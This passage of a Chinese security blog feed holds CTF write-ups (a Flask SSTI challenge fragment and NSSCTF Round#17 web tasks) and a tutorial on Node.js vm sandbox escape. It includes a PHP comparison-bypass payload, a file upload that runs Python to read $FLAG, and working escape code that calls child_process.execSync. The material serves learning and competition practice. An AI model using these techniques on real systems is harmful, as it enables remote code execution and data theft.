<span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>)) </span><br><span class="line">        res = render_template_string(tmp) </span><br><span class="line">        flash( res ) </span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>)) </span><br><span class="line">    <span class="keyword">else</span> : </span><br><span class="line">        text = <span class="string">&quot;&quot;</span> </span><br><span class="line">        form = NameForm1(text) </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form, method = <span class="string">&quot;ãÆ&quot;</span> , img = <span class="string">&quot;flask1.png&quot;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;name&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">name</span>): </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>,name = name) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>禁了一些常用的词</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GYCTF2020-FlaskApp&quot;&gt;&lt;a href=&quot;#GYCTF2020-FlaskApp&quot; class=&quot;headerlink&quot; title=&quot;[GYCTF2020]FlaskApp&quot;&gt;&lt;/a&gt;[GYCTF2020]FlaskApp&lt;/h1&gt;&lt;p&gt;在解密的</summary>
      
    
    
    
    <category term="buu刷题记录" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="Flask审计" scheme="http://example.com/tags/Flask%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="ssti" scheme="http://example.com/tags/ssti/"/>
    
    <category term="jinja2" scheme="http://example.com/tags/jinja2/"/>
    
  </entry>
  
  <entry>
    <title>nssctf-#round-17-basic-web</title>
    <link href="http://example.com/2024/01/28/nssctf-round-17-basic-web/"/>
    <id>http://example.com/2024/01/28/nssctf-round-17-basic-web/</id>
    <published>2024-01-28T09:29:36.000Z</published>
    <updated>2024-01-28T09:31:16.140Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NSSCTF-Round-17-Basic-Web"><a href="#NSSCTF-Round-17-Basic-Web" class="headerlink" title="NSSCTF Round#17 Basic Web"></a>NSSCTF Round#17 Basic Web</h1><h2 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h2><p>一点进去就看见网页标题robots?</p><p>看下robots.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hint:E794A8E688B7E5908DE7869FE68289E590972CE696B0E7949FE8B59BE58FAFE98187E8A781E8BF87E593A67E0AE8AEB0E5BE97E794A8E688B7E5908DE585A8E794A8E5B08FE58699E593A6EFBD9EEFBD9E</span><br><span class="line">username:13 44 21 15 42</span><br><span class="line">password:LF5GY3KZKRVTCT2EM54FUV2FO5GVIVLZJZ5GW6C2IRJGQTT2KU2VUR2GNJNEIYZVLJDVKPI=</span><br></pre></td></tr></table></figure><p>这里的hint不难发现只有16进制的字母,16进制解一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名熟悉吗,新生赛可遇见过哦~</span><br><span class="line">记得用户名全用小写哦～～</span><br></pre></td></tr></table></figure><p>确实是没什么用</p><p>password应该是base编码</p><p>用一次base32＋一次base64解得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c9fa95881ea0152791d4a759dacd79de</span><br></pre></td></tr></table></figure><p>再用在线的MD5解密工具解得密码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nss</span><br></pre></td></tr></table></figure><p>MD5解密网站:<a href="https://www.somd5.com/">https://www.somd5.com/</a></p><p>至于username,求助某密码手tldys得知是棋盘密码</p><p>解得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfer</span><br></pre></td></tr></table></figure><p>登录成功后查看网页源代码,按照hint访问&#x2F;F111n4l.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>] == <span class="number">732339662</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;is_numeric(<span class="subst">$_GET</span>[nss])==0&quot;</span>) || <span class="keyword">die</span>(<span class="string">&#x27;oops!此路不通！！&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这里不是说了吗！！！必须是 732339662 (招新群群号！)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;啊？这是什么新型比较？&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;是不是题错了啊&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个php比较在网上也是可以直接查到解法</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?nss=732339662,1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240128155341527.png" alt="image-20240128155341527"></p><p>拿到flag</p><h2 id="真的是文件上传吗？"><a href="#真的是文件上传吗？" class="headerlink" title="真的是文件上传吗？"></a>真的是文件上传吗？</h2><p>一进去就看见fuck编码</p><p>解码结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BrainFuck解码:You want a hint?</span><br><span class="line">Give me a flag!!!!</span><br><span class="line">And you will hava hint!**************</span><br></pre></td></tr></table></figure><p>经典的give me a flag</p><p>get传参一个flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240128155903200.png" alt="image-20240128155903200"></p><p>这里差点以为是ssti了,幸亏没有钻牛角尖,试了一手就没管了</p><p>源码里面有东西,但是好像没什么用</p><p>还是看upload的地方</p><p>随便传一张图片,发现居然会报错</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/2.2.2 Python/3.8.15</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 28 Jan 2024 08:01:19 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>265</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-xml">阿对对对传对了 那路径在哪里呢？!<span class="comment">&lt;!--   File &quot;upload/35341583_p0.jpg&quot;, line 1</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">SyntaxError: Non-UTF-8 code starting with &#x27;\xff&#x27; in file upload/35341583_p0.jpg on line 1, but no encoding declared; see http://python.org/dev/peps/pep-0263/ for details --&gt;</span></span></span><br></pre></td></tr></table></figure><p>查了下这个pep</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240128160326244.png" alt="image-20240128160326244"></p><p>似乎是语法规范,或许这里直接执行了python代码?</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240128160521433.png" alt="image-20240128160521433"></p><p>确实是啊</p><p>那就可以直接rce</p><p>通过查看app.py的内容,发现flag在环境变量里</p><p>最终poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node1.anna.nssctf.cn:28886</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------251223018415561458614127786332</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>250</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://node1.anna.nssctf.cn:28886</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://node1.anna.nssctf.cn:28886/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------251223018415561458614127786332</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;3.png&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="language-pgsql">os.<span class="keyword">system</span>(<span class="string">&#x27;echo $FLAG&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------251223018415561458614127786332--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/2.2.2 Python/3.8.15</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 28 Jan 2024 08:07:44 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>100</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">阿对对对传对了 那路径在哪里呢？!<span class="comment">&lt;!-- NSSCTF</span></span><span class="template-variable">&#123;b86f6f24-8687-43ec-95b2-7bd2504b711b&#125;</span><span class="language-xml"><span class="comment"> --&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NSSCTF-Round-17-Basic-Web&quot;&gt;&lt;a href=&quot;#NSSCTF-Round-17-Basic-Web&quot; class=&quot;headerlink&quot; title=&quot;NSSCTF Round#17 Basic Web&quot;&gt;&lt;/a&gt;NSSCTF Roun</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://example.com/categories/WriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>初步认识NodeJs VM和VM2沙箱逃逸</title>
    <link href="http://example.com/2024/01/24/%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86NodeJs-VM%E5%92%8CVM2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>http://example.com/2024/01/24/%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86NodeJs-VM%E5%92%8CVM2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2024-01-24T09:13:05.000Z</published>
    <updated>2024-01-25T08:06:01.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h1><h2 id="常用的vm模块的API"><a href="#常用的vm模块的API" class="headerlink" title="常用的vm模块的API"></a>常用的vm模块的API</h2><h4 id="vm-runinThisContext-code"><a href="#vm-runinThisContext-code" class="headerlink" title="vm.runinThisContext(code)"></a>vm.runinThisContext(code)</h4><blockquote><p>在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20221118183902-378e6dda-672d-1.png"></p><p>示例:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> localVar = <span class="string">&#x27;initial value&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> vmResult = vm.<span class="title function_">runInThisContext</span>(<span class="string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;vmResult:&#x27;</span>, vmResult);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;localVar:&#x27;</span>, localVar); </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmResult: vm</span><br><span class="line">localVar: initial value</span><br></pre></td></tr></table></figure><h4 id="vm-createContext-sandbox"><a href="#vm-createContext-sandbox" class="headerlink" title="vm.createContext([sandbox])"></a>vm.createContext([sandbox])</h4><blockquote><p> 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象__在当前global外再创建一个作用域__，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部__无法访问global中的属性__。</p></blockquote><h4 id="vm-runInContext-code-contextifiedSandbox-options"><a href="#vm-runInContext-code-contextifiedSandbox-options" class="headerlink" title="vm.runInContext(code, contextifiedSandbox[, options])"></a>vm.runInContext(code, contextifiedSandbox[, options])</h4><blockquote><p>参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20221118183946-521c54fa-672d-1.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>)</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">globalVar</span> = <span class="number">3</span></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;</span><br><span class="line">    <span class="attr">globalVar</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">vm.<span class="title function_">createContext</span>(sandbox)</span><br><span class="line">vm.<span class="title function_">runInContext</span>(<span class="string">&#x27;globalVar *= 2;&#x27;</span>, sandbox)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(globalVar))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; globalVar: 2 &#125;</span><br><span class="line">3</span><br></pre></td></tr></table></figure><blockquote><p>util.inspect(object,[showHidden],[depth],[colors]) 是<strong>一个将任意对象转换为字符串的方法，通常用于调试和错误输出</strong>。 它至少接受一个参数object，即要转换的对象。</p></blockquote><h4 id="vm-runInNewContext-code-sandbox-options"><a href="#vm-runInNewContext-code-sandbox-options" class="headerlink" title="vm.runInNewContext(code[, sandbox][, options])"></a>vm.runInNewContext(code[, sandbox][, options])</h4><blockquote><p>creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。</p></blockquote><h4 id="vm-Script类"><a href="#vm-Script类" class="headerlink" title="vm.Script类"></a>vm.Script类</h4><blockquote><p> vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</p></blockquote><h4 id="new-vm-Script-code-options"><a href="#new-vm-Script-code-options" class="headerlink" title="new vm.Script(code, options)"></a>new vm.Script(code, options)</h4><blockquote><p>创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;</span><br><span class="line">    <span class="attr">animal</span>: <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">    <span class="attr">count</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox)</span><br><span class="line">script.<span class="title function_">runInContext</span>(context)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; animal: &#x27;cat&#x27;, count: 3, name: &#x27;kitty&#x27; &#125;</span><br></pre></td></tr></table></figure><h2 id="vm沙箱逃逸的一些情况"><a href="#vm沙箱逃逸的一些情况" class="headerlink" title="vm沙箱逃逸的一些情况"></a>vm沙箱逃逸的一些情况</h2><blockquote><p>我们一般进行沙箱逃逸最后都是进行rce，那么在Node里要进行rce就需要procces了，在获取到process对象后我们就可以用require来导入child_process，再利用child_process执行命令。但process挂载在global上，但是我们上面说了在<code>creatContext</code>后是不能访问到global的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。</p></blockquote><h4 id="this"><a href="#this" class="headerlink" title="this"></a>this</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return process.env&#x27;)()`</span>);</span><br><span class="line"><span class="comment">//const y1 = vm.runInNewContext(`this.toString.constructor(&#x27;return process&#x27;)()`);</span></span><br><span class="line">y1.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p>这里面的this指向的是当前传递给<code>runInNewContext</code>的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用Function的constructor生成的函数，最终返回了一个process对象。</p><h4 id="重写toString函数-arguments-callee-caller"><a href="#重写toString函数-arguments-callee-caller" class="headerlink" title="重写toString函数+arguments.callee.caller"></a>重写toString函数+arguments.callee.caller</h4><blockquote><p>函数中的内置对象的属性<code>arguments.callee.caller</code>，它可以返回函数的调用者。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`(() =&gt; &#123;</span></span><br><span class="line"><span class="string">    const a = &#123;&#125;</span></span><br><span class="line"><span class="string">    a.toString = function () &#123;</span></span><br><span class="line"><span class="string">      const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">  &#125;)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br></pre></td></tr></table></figure><p>这里toString被重写,而console.log时的字符串拼接触发了toString,此时的调用者为global下的console.log,自然就返回了一个外部对象,由此进行rce</p><h4 id="Proxy-get-钩子-arguments-callee-caller"><a href="#Proxy-get-钩子-arguments-callee-caller" class="headerlink" title="Proxy get:钩子 + arguments.callee.caller"></a>Proxy get:钩子 + arguments.callee.caller</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">(() =&gt;&#123;</span></span><br><span class="line"><span class="string">    const a = new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">abc</span>)</span><br></pre></td></tr></table></figure><p>触发利用链的逻辑就是我们在<code>get:</code>这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。</p><p>此时的调用者依然在沙箱外,即arguments.callee.caller返回的对象是沙箱外的对象</p><p><strong>当沙箱的返回值返回的是我们无法利用的对象或者没有返回值时</strong>,还可以借助异常,将沙箱内的对象抛出去,然后在外部抛出</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">    throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    vm.<span class="title function_">runInContext</span>(script, vm.<span class="title function_">createContext</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)));</span><br><span class="line">&#125;<span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error:&quot;</span> + e) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。</p><h1 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a></p>]]></content>
    
    
      
      
